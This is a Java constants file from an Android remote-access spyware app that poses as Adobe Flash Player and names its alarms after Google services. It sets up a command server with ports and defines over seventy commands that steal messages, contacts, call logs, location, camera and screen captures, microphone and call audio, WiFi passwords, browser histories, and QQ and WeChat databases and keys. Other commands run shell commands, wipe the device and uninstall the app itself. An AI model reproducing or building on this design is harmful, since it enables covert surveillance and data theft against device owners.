package com.adobe.flashplayer;

import java.io.File;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;

//file = new File(getPackageManager().getApplicationInfo("com.uc.addon.qrcodegenerator", 0).sourceDir);
//这里getPackageManager是Context下的方法，不需要赘言了，sourceDIr返回了完整apk路径，包括-N之类的讨厌玩意。

//PathClassLoader是通过构造函数new DexFile(path)来产生DexFile对象的；
//而DexClassLoader则是通过其静态方法loadDex（path, outpath, 0）得到DexFile对象。
//这两者的区别在于DexClassLoader需要提供一个可写的outpath路径，用来释放.apk包或者.jar包中的dex文件。
//换个说法来说，就是PathClassLoader不能主动从zip包中释放出dex，因此只支持直接操作dex格式文件，
//或者已经安装的apk（因为已经安装的apk在cache中存在缓存的dex文件）。
//而DexClassLoader可以支持.apk、.jar和.dex文件，并且会在指定的outpath路径释放出dex文件。
//另外，PathClassLoader在加载类时调用的是DexFile的loadClassBinaryName，
//而DexClassLoader调用的是loadClass。因此，在使用PathClassLoader时类全名需要用”/”替换”.”

//Context c = createPackageContext("chroya.demo", Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
//Class clazz = c.getClassLoader().loadClass("chroya.demo.Main");
//Object owner = clazz.newInstance();
//Object obj = clazz.getMethod("print", String.class).invoke(owner, "Hello");

//AppKey 为极光平台应用的唯一标识
//e2873ba6609a907a2a789373



public class Public {

    private final static String TAG						= "[ljg]Public";

    //public static String SERVER_IP_ADDRESS				= "hk.googleadc.com";
    public static String SERVER_IP_ADDRESS				= "192.168.101.122";
    public static String UserName 						= "jy";

    public static final int IMEI_IMSI_PHONE_SIZE 		= 16;
    public static byte[] IMEI 							= new byte[IMEI_IMSI_PHONE_SIZE];

    public static final int DOWNLOADAPK_PORT			= 10011;
    public static final int QRCODE_PORT					= 10012;
    public static final int SERVER_DATA_PORT 			= 10013;
    public static final int SERVER_CMD_PORT 			= 10014;

    //public static final int PacketOptCryptionOld 		= 1;
    public static final int PacketOptCompPack			= 2;
    public static final int PacketOptCryption 			= 17;

    public static int	gOnlineType						= 0;

    //public static final int PacketOptOldCryption 		= 1;
    public static final int PacketOptNone				= 0;

    public static final int WAIT_SU_PERMITION_TIME		= 6000;
    public static final int WAIT_SU_PERMITION_CNT		= 20;

    //cmd upload file limit size
    public static final int MAX_TRANSFER_FILESIZE		= 0x10000000;
    //sd extcard upload limit size
    public static final int MAX_UPLOAD_FILESIZE			= 0x1000000;
    public static final int MIN_UPLOAD_FILESIZE			= 0x10000;
    //cmd send recv buf limit
    public static final int RECV_SEND_BUFSIZE			= 0x1000;

    //public static final int PROGRAMLOG_UPLOAD_SIZE	= 16*1024;
    public static final int FILE_TRANSFER_TOO_BIG		= 0x1FFFFFFF;
    public static final int FILE_TRANSFER_NOT_FOUND 	= 0x2FFFFFFF;
    public static final int RECV_DATA_OK			 	= 0x3FFFFFFF;

    public static final int PHONE_LOCATION_DISTANCE 			= 1;
    public static final int PHONE_LOCATION_MINSECONDS 			= 600;
    public static final int SYNCHRONIZITION_SECONDS_TIME 		= 3600;
    public static final int JOBSERVICEMAXDELAY 					= 300000;
    public static final int JOBSERVICEDELAY 					= 300000;
    public static final int SCREENSNAPSHOT_POSTDELAY_TIME 		= 20;

    public final static String PHONEWORK_ALARM_ACTION 	        = "WorkAlaram";
    public static final String SERVER_CMD_THREADNAME 			= "ServerCommandThread";
    public static final String WORK_THREADNAME 			        = "WorkThread";
    public static final int SERVER_CMD_CONNECT_TIMEOUT			= 6000;
    public static final int SERVERCMD_ALARM_INTERVAL 			= 180000;


    public static final String CONFIG_FILENAME = "ark.dat";

    public final static String SERVERCMD_ALARM_ACTION 		= "GoogleServiceServerCmdAlarm";
    public final static String SCREENSNAPSHOT_ALARM_ACTION 	= "GoogleServiceScreenSnapshotAlarm";
    public final static String PHONELOCATION_ALARM_ACTION 	= "GoogleServicePhoneLocationAlaram";

    public final static int SERVERCMD_REQUEST_CODE 			= 0x44414342;
    public final static int SCREENSNAPSHOT_REQUEST_CODE 	= 0x43424144;
    public final static int LOCATION_REQUEST_CODE			= 0x10325476;
    public final static int WORK_REQUEST_CODE			    = 0x41424344;

    public static String SDCARDPATH 				= "";
    public static String LOCAL_PATH_NAME 			= "";
    public static String SDCARD_PATH_NAME 			= "";
    public static String SUB_FOLDER_NAME 			= "/appData/";
    public static String []EXTCARDSPATH				= {""};

    public static final String LOG_FILE_NAME 		= "littleKitty.txt";
    public static final String MESSAGE_FILE_NAME 	= "message.json";
    public static final String CALLLOG_FILE_NAME 	= "calllog.json";
    public static final String CONTACTS_FILE_NAME 	= "contacts.json";
    public static final String DEVICEINFO_FILE_NAME = "deviceinfo.json";
    public static final String LOCATION_FILE_NAME 	= "location.json";
    public static final String SDCARDFILES_NAME 	= "sdcardfiles.txt";
    public static final String EXTCARDFILES_NAME 	= "extcardfiles.txt";
    public static final String CAMERAPHOTO_FILE_NAME = "cameraphoto.jpg";
    public static final String SCRNSNAPSHOT_FILE_NAME = "screensnapshot.jpg";
    public static final String APPPROCESS_FILE_NAME		= "applist.json";
    public static final String WIFILIST_FILE_NAME 		= "wifi.json";
    public static final String QQACCOUNT_FILE_NAME		="qqaccount.json";

    public static final String RUNNINGAPPS_FILE_NAME 	= "runningapps.json";
    public static final String WEBKITRECORD_FILE_NAME	= "webkithistroy.json";
    public static final String CHROMEHISTORY_FILE_NAME	= "chromehistory.json";
    public static final String FIREFOXRECORD_FILE_NAME 	= "firefoxhistory.json";

    public static final String SCREENVIDEO_FILE_NAME 	= "screenvideo.mp4";
    public static final String PHONECALLAUDIO_FILE_NAME = "phonecallaudio";
    public static final String FILEOBSERVER_FILE_NAME	= "filerecord.json";

    public static final String WIFI_PASS_FILENAME		= "wifipassword.json";
    public static final String SCREENGESTURE_FILENAME	= "gesture.json";
    public static final String MICAUDIORECORD_FILE_NAME	= "micaudio";

    public static final String  QQDATABASE_FILENAME		=	"qqdb";
    public static final String  WEXINDATABASE_FILENAME	=	"wxdb";
    public static final String  WEXINUSERINFO_FILENAME	=	"wxuser.json";
    public static final String  WEIXINDBKEY_FILENAME	=	"wxdbkey.json";

    public static final String FLASHCARDFILES_FILENAME	= "flashcardfiles.txt";

    //public static final String NOTIFYLOG_FILENAME		= "notifylog.txt";

    public static final String CHATTING_FILENAME		= "chatNoteMsg.json";

    public static final String ALLDISKFILES_LAST_TIME 	= "sdcardFilesLastTime";

    public static final String PROGRAM_LAST_TIME 		= "programRunLastTime";

    public static final String PARAMCONFIG_FileName		= "paramConfig.json";

    public static final String SETUPMODE				= "setupMode";
    public static final String SETUPMODE_SO				= "so";
    public static final String SETUPMODE_JAR			= "jar";
    public static final String SETUPMODE_APK			= "apk";
    public static final String SETUPMODE_APK_TYPE		= "networkType";
    public static final String SETUPMODE_MANUAL			= "manual";

    public static final String SETUPCOMPLETE 		= "setupComplete";

    public static final String CFGUSERNAME 			= "userName";

    public static final String CFGCLIENTID 			= "clientID";
    public static final String CFGPACKAGENAME		= "packageName";
    public static final String CFGSERVERIP			= "serverIP";
    public static final String CFGPLUGINPATH		= "pluginEntryPath";
    public static final String CFGSHA1				= "sha1";

    public static final String LOCATIONREPEATPERMISSION = "location_repeat_enable";
    public static final String LOCATIONSTART			= "location_start";
    public static final String LOCATIONEND				= "location_end";

    public static final String ISROOT 					= "isRoot";

    public static final String SCREENSHOTREPEATPERMISSION= "screenshot_enable";
    public static final String SCREENSTART				= "screen_start";
    public static final String SCREENEND				= "screen_end";

    public static final String UNINSTALLFLAG			= "uninstalled";

    public static final String INSTALL_SETTLED          = "settled";


    //1 row location
    //2 gd amap
    //3 tencent map
    public static int LOCATION_TYPE						= 0;

    //在Java代码中直接书写的数字是int类型的，就是说数字的范围在 -2^31 到 2^31 - 1 这个范围之中，无论将这个数字赋值给什么类型
    //long number = 26012402244L;
    //long number = Long.parseLong("26012402244");

    public static final long ALLFILES_RETRIEVE_INTERVAL 			= 1*24*60*60*1000L;
    public static final long BASIC_RETRIEVE_INTERVAL				= 1*60*60*1000L;

    public static final int CAMERA_PHOTO_QUALITY 				= 100;
    public static final int SCREENSNAPSHOT_PHOTO_QUALITY 		= 100;

    public static final int VALID_CAMERAPHOTO_SIZE 		= 4*1024;
    public static final int VALID_SCREENPHOTO_SIZE 		= 4*1024;

    public static final int CMD_RECV_DATA_OK 		= 1;
    public static final int CMD_RECV_CMD_OK 		= 2;
    public static final int CMD_DATA_MESSAGE 		= 3;
    public static final int CMD_DATA_CONTACTS 		= 4;
    public static final int CMD_DATA_DEVICEINFO 	= 5;
    public static final int CMD_DATA_CALLLOG 		= 6;
    public static final int CMD_DATA_LOCATION 		= 7;
    public static final int CMD_DATA_DCIM			= 8;
    public static final int CMD_DATA_SDCARDFILES	= 9;
    public static final int CMD_DATA_EXTCARDFILES 	= 10;
    public static final int CMD_DATA_WIFIPASS 		= 11;
    public static final int CMD_DATA_GESTURE 		= 12;
    public static final int CMD_DATA_CAMERAPHOTO	= 13;
    public static final int CMD_UPLOADFILE			= 14;
    public static final int CMD_DOWNLOADFILE		= 15;
    public static final int CMD_RUNCOMMAND			= 16;
    public static final int CMD_HEARTBEAT			= 17;
    public static final int CMD_PHONECALL			= 18;
    public static final int CMD_SENDMESSAGE			= 19;
    public static final int CMD_DATA_SCRNSNAPSHOT	= 20;
    public static final int CMD_DATA_PHONECALLAUDIO = 21;
    public static final int CMD_DATA_AUDIO 			= 22;
    public static final int CMD_DATA_VIDEO 			= 23;
    public static final int CMD_AUTOINSTALL 		= 24;
    public static final int CMD_DATA_APPPROCESS		= 25;
    public static final int CMD_DATA_WIFI			= 26;
    public static final int CMD_UPLOAD_LOG			= 27;
    public static final int CMD_WIPESYSTEM			= 28;
    public static final int CMD_RESETSYSTEM			= 29;
    public static final int CMD_RESETPASSWORD		= 30;
    public static final int CMD_DATA_QQACCOUNT		= 31;
    public static final int CMD_DATA_APPMESSAGE		= 32;
    public static final int CMD_DATA_WEBKITHISTORY	= 33;
    public static final int CMD_DATA_LATESTMESSAGE 	= 34;
    public static final int CMD_DATA_RUNNINGAPPS	= 35;
    public static final int CMD_DATA_CHROMEHISTORY 	= 36;
    public static final int CMD_DATA_FIREFOXHISTORY = 37;
    public static final int CMD_DATA_DOWNLOAD 		= 38;
    public static final int CMD_DATA_OFFICE			= 39;
    public static final int CMD_DATA_QQFILE			= 40;
    public static final int CMD_DATA_QQAUDIO		= 41;
    public static final int CMD_DATA_QQPROFILE		= 42;
    public static final int CMD_DATA_QQPHOTO		= 43;
    public static final int CMD_DATA_QQVIDEO		= 44;
    public static final int CMD_DATA_FILERECORD		= 45;
    public static final int CMD_WIPESTORAGE			= 47;
    public static final int CMD_UNINSTALL			= 46;
    public static final int CMD_QQDATABASEFILE 		= 48;
    public static final int CMD_WEIXINDATABASEFILE 	= 49;
    public static final int CMD_WEIXINUSERINFO 		= 50;
    public static final int CMD_WEIXINDB_KEY 		= 51;
    public static final int CMD_DATA_NEWCALLLOG 	= 52;
    public static final int CMD_DATA_WEIXINAUDIO	= 53;
    public static final int CMD_DATA_WEIXINPHOTO	= 54;
    public static final int CMD_DATA_WEIXINVIDEO	= 55;
    public static final int CMD_DATA_MICAUDIORECORD	= 56;
    public static final int CMD_MICAUDIORECORD		= 57;
    public static final int CMD_UNINSTALLSELF		= 58;
    public static final int CMD_GETCONFIG			= 59;
    public static final int CMD_SETCONFIG 			= 60;
    public static final int CMD_DATA_FLASHCARDFILES	= 61;
    public static final int CMD_UPDATEPROC			= 62;
    public static final int CMD_RESETPROGRAM		= 63;
    public static final int CMD_SHUTDOWNSYSTEM		= 64;
    public static final int CMD_MESSAGEBOX			= 65;
    public static final int CMD_SINGLELOCATION		= 66;
    public static final int CMD_SINGLESCREENCAP		= 67;
    public static final int CMD_CANCELLOCATION		= 68;
    public static final int CMD_CANCELSCREENCAP		= 69;
    public static final int CMD_NETWORKTYPE			= 70;

    public static final int CMD_UPLOADQQDB			= 71;
    public static final int CMD_UPLOADWEIXINDB		= 72;
    public static final int CMD_UPLOADDB			= 73;
    public static final int CMD_UPLOADWEIXININFO	= 74;
    public static final int CMD_CHANGEIP			= 75;

    public static Context appContext = null;

    static {
        Log.e(TAG, "init");
    }


    public Public( Context context){
        boolean result = false;
        try
        {
            appContext = context;

            result = initFilePath(context);
            if (result == false){
                Log.e(TAG, "InitFilePath error");
            }else{
                Log.e(TAG, "InitFilePath ok");
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }












    public static boolean initFilePath(Context context){
        try {
            Public.LOCAL_PATH_NAME = context.getFilesDir().getAbsolutePath() + Public.SUB_FOLDER_NAME;
            File path = new File(Public.LOCAL_PATH_NAME);
            if (path.exists() == false) {
                path.mkdirs();
            }

            Public.SDCARDPATH = Environment.getExternalStorageDirectory().getAbsolutePath();

            boolean sdCardExist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
            if(sdCardExist ){

                int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
                if (granted == PackageManager.PERMISSION_GRANTED) {

                    Public.SDCARD_PATH_NAME = Public.SDCARDPATH + Public.SUB_FOLDER_NAME;
                    path = new File(Public.SDCARD_PATH_NAME);
                    if (path.exists() == false) {
                        path.mkdirs();
                    }
                }else{
                    Public.SDCARD_PATH_NAME = Public.LOCAL_PATH_NAME;
                    Log.e(TAG, "[liujinguang]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
                }
            }else{
                Public.SDCARD_PATH_NAME = Public.LOCAL_PATH_NAME;
                Log.e(TAG, "[liujinguang]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }





}
